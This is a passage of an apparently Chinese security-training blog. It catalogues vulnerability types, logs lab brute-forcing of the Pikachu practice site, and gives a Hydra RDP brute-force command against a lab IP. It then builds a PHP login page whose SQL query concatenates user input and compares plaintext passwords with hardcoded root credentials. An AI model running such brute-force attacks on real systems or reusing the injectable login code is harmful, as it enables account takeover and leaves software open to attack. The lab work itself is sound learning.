title="10.密码学与传输漏洞"></a>10.密码学与传输漏洞</h4><ul><li><p>弱加密算法（如使用 MD5、SHA1 存储密码）</p><p>成因：使用 MD5&#x2F;SHA1 存储密码</p><p>危害：撞库</p></li><li><p>密钥泄露（硬编码密钥、日志泄露密钥）</p><p>成因：密钥容易获取</p><p>危害：泄露敏感信息，密码爆破</p></li><li><p>明文存储密码（数据库直接存储明文密码）</p><p>成因：数据库存明文或 HTTP 传输密码</p><p>危害：泄露敏感信息</p></li><li><p>加密传输缺失（未用 HTTPS，数据明文传输）</p><p>成因：数据库存明文或 HTTP 传输密码</p><p>危害：泄露敏感信息</p></li><li><p>SSL&#x2F;TLS 配置漏洞（支持弱加密套件、协议版本过低）</p><p>成因：支持弱加密套件</p><p>危害：泄露敏感信息</p></li></ul><h4 id="11-API-与新兴技术漏洞"><a href="#11-API-与新兴技术漏洞" class="headerlink" title="11.API 与新兴技术漏洞"></a>11.API 与新兴技术漏洞</h4><ul><li><p>API 未授权访问（接口缺少认证，直接调用）</p><p>成因：接口无身份验证</p><p>危害：直接获取&#x2F;篡改所有用户数据</p></li><li><p>API 参数篡改（修改接口参数越权操作）</p><p>成因：接口无身份验证</p><p>危害：直接获取&#x2F;篡改所有用户数据</p></li></ul><h4 id="12-其他类型漏洞"><a href="#12-其他类型漏洞" class="headerlink" title="12.其他类型漏洞"></a>12.其他类型漏洞</h4><ul><li><p>反序列化漏洞（如 Java&#x2F;PHP 反序列化执行命令）</p><p>成因：反序列化数据未校验，使用魔术方法</p><p>危害：远程代码执行</p></li><li><p>服务器端请求伪造（SSRF，诱导服务器请求内网资源）</p><p>成因：服务器代理请求未限制目标</p><p>危害：探测内网、攻击内部系统</p></li><li><p>模板注入（如 Jinja2&#x2F;Twig 注入，执行代码）</p><p>成因：用户输入直接拼接到模板</p><p>危害：执行服务器代码</p></li></ul><h3 id="二、使用burp和yakit完成pikachu暴力破解漏洞前三"><a href="#二、使用burp和yakit完成pikachu暴力破解漏洞前三" class="headerlink" title="二、使用burp和yakit完成pikachu暴力破解漏洞前三"></a>二、使用burp和yakit完成pikachu暴力破解漏洞前三</h3><h4 id="1-基于表单的暴力破解"><a href="#1-基于表单的暴力破解" class="headerlink" title="1.基于表单的暴力破解"></a>1.基于表单的暴力破解</h4><p>①随意输入账户密码，点击login，用yakit进行抓包</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181938245.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181939362.png"></p><p>②进入FUZZ测试</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181939602.png"></p><p>③选中参数，配置字典</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181940938.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181941628.png"></p><p>④发送请求</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181942397.png"></p><p>通过响应大小判断爆破成功</p><h4 id="2-验证码绕过-on-server"><a href="#2-验证码绕过-on-server" class="headerlink" title="2.验证码绕过(on server)"></a>2.验证码绕过(on server)</h4><p>①同上，抓包</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181944703.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181945976.png"></p><p>②尝试在请求包里修改账号和密码，输入新生成的验证码</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181947981.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181948647.png"></p><p>发现验证码不会过期</p><p>③同第一关进行爆破</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181950682.png"></p><p>成功爆破</p><h4 id="3-验证码绕过-on-client"><a href="#3-验证码绕过-on-client" class="headerlink" title="3.验证码绕过(on client)"></a>3.验证码绕过(on client)</h4><p>①同上，抓包，尝试修改账户和密码</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181953336.png"></p><p>发现仍然不会过期</p><p>②加载字典，爆破</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508181955579.png"></p><p>爆破成功</p><h3 id="三、针对phpstudy所在的服务器，使用Hydra爆破rdp"><a href="#三、针对phpstudy所在的服务器，使用Hydra爆破rdp" class="headerlink" title="三、针对phpstudy所在的服务器，使用Hydra爆破rdp"></a>三、针对phpstudy所在的服务器，使用Hydra爆破rdp</h3><p>①编写用户字典和密码字典</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim user.txt</span><br><span class="line">vim pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508182034791.png"></p><p>②开始爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt 192.168.18.171 rdp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508182050082.png"></p><p>成功爆破</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web练习4</title>
      <link href="/2025/08/14/web%E7%BB%83%E4%B9%A04/"/>
      <url>/2025/08/14/web%E7%BB%83%E4%B9%A04/</url>
      
        <content type="html"><![CDATA[<h4 id="1、创建一个名称为cms的数据库，创建user表，字段要求具备id-uasername-password"><a href="#1、创建一个名称为cms的数据库，创建user表，字段要求具备id-uasername-password" class="headerlink" title="1、创建一个名称为cms的数据库，创建user表，字段要求具备id,uasername,password"></a>1、创建一个名称为cms的数据库，创建user表，字段要求具备id,uasername,password</h4><p>①创建数据库cms</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database cms;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508151405541.png"></p><p>已经创建好cms数据库</p><p>②创建表user</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table cms.user(id int auto_increment primary key,uname char(32),pass char(32));</span><br><span class="line"></span><br><span class="line">//设置主键为id，并且自增</span><br><span class="line">auto_increment primary key </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508151414581.png"></p><p>创建了user表，并且具有id，uname，pass字段</p><h4 id="2、使用前端代码编写一个登录页面，具体后端功能点可以先不实现"><a href="#2、使用前端代码编写一个登录页面，具体后端功能点可以先不实现" class="headerlink" title="2、使用前端代码编写一个登录页面，具体后端功能点可以先不实现"></a>2、使用前端代码编写一个登录页面，具体后端功能点可以先不实现</h4><p>①编写代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;登录&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">        用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="line">        密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;form method=&quot;get&quot; action=&quot;register.php&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>②效果展示</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508151435472.png"></p><p>这个登录框有点丑陋</p><p>③ai美化</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        * &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Arial&#x27;</span>, sans-serif;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f5f7fa</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">min-height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">4px</span> <span class="number">20px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">label</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#555</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">500</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: border-color <span class="number">0.3s</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span><span class="selector-pseudo">:focus</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span><span class="selector-pseudo">:focus</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-color</span>: <span class="number">#4a90e2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">outline</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">74</span>, <span class="number">144</span>, <span class="number">226</span>, <span class="number">0.2</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-actions</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">gap</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">600</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: background-color <span class="number">0.3s</span>, transform <span class="number">0.1s</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn-primary</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#4a90e2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn-primary</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#3a7bc8</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn-primary</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.98</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn-secondary</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#555</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn-secondary</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#e0e0e0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn-secondary</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.98</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.error-message</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#e74c3c</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fadbd8</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-actions&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-secondary&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;window.location.href=&#x27;register.php&#x27;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>④美化效果</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508151437225.png"></p><p>美化之后就比较顺眼</p><p>⑤编写php处理逻辑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//数据库配置</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$dbusername = &quot;root&quot;;</span><br><span class="line">$dbpassword = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;cms&quot;;</span><br><span class="line"></span><br><span class="line">//后端处理前端提交的参数</span><br><span class="line">if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">    //建立数据库连接</span><br><span class="line">    $conn = @mysqli_connect($servername,$dbusername,$dbpassword,$dbname);</span><br><span class="line">    </span><br><span class="line">    //执行sql语句，查询unmae和pass，将结果赋值给变量数组$row</span><br><span class="line">    $sql = &quot;select uname,pass from user where username=&#x27;$username&#x27;&quot;; </span><br><span class="line">    $result = mysqli_query($conn,$sql);</span><br><span class="line">    $row = mysqli_fetch_assoc($result);</span><br><span class="line">    </span><br><span class="line">    //判断是否存在用户，有则执行下一个if</span><br><span class="line">    if($row)&#123;</span><br><span class="line">        //如果密码正确，则成功登录，跳转到主页面</span><br><span class="line">        if($row[&#x27;pass&#x27;] == $password)&#123;</span><br><span class="line">            echo &quot;登录成功&quot;;</span><br><span class="line">            header(&quot;Location:good.html&quot;);</span><br><span class="line">            exit;</span><br><span class="line">            </span><br><span class="line">            //输入密码和数据库中查询的密码不匹配，则报错</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;用户名或密码错误&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        //如果不存在用户，则报错</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">echo &quot;用户名或密码错误&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将php代码整合到html，实现登录功能的前后端逻辑</p><h4 id="3、在登录页面引入注册功能点，要求用户可以注册账户写入到cms数据库，可选实现当id冲突时注册失败"><a href="#3、在登录页面引入注册功能点，要求用户可以注册账户写入到cms数据库，可选实现当id冲突时注册失败" class="headerlink" title="3、在登录页面引入注册功能点，要求用户可以注册账户写入到cms数据库，可选实现当id冲突时注册失败"></a>3、在登录页面引入注册功能点，要求用户可以注册账户写入到cms数据库，可选实现当id冲突时注册失败</h4><p>①编写代码</p><p>在登录页面已经设置了一个点击注册跳转，那么现在需要一个注册页面</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是注册前端页面源代码，需要做个美化</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        * &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f5f7fa</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">135deg</span>, <span class="number">#f5f7fa</span> <span class="number">0%</span>, <span class="number">#c3cfe2</span> <span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">min-height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">5px</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span 